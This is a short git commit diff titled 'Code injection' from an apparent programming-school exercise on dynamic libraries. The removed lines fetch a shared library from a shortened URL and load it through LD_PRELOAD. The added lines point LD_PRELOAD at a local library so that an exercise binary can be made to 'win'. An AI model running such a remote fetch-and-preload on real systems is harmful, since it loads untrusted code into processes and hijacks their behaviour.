d9e17b7fbdfb3523013cf3ef87feda0398a3f47c
Maryann529 <maryann.pclng@gmail.com>
2022-06-14 05:51:36 -0700

    A  Code injection:

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,4 +1,3 @@
 #!/bin/bash
-wget -P .. 
-export LD_PRELOAD="$(mktemp -d)/libevil.so${LD_PRELOAD:+:${LD_PRELOAD}}"
-LD_PRELOAD="" python3 - "${LD_PRELOAD%%/libevil.so*}/libevil.so" <<<'__import__("shutil").copyfileobj(__import__("urllib.request").request.urlopen("https://tinyurl.com/cr4ckm3"), open(__import__("sys").argv[1], "wb"))'
+wget -P ..
+export LD_PRELOAD="$PWD/../libgiga.so"
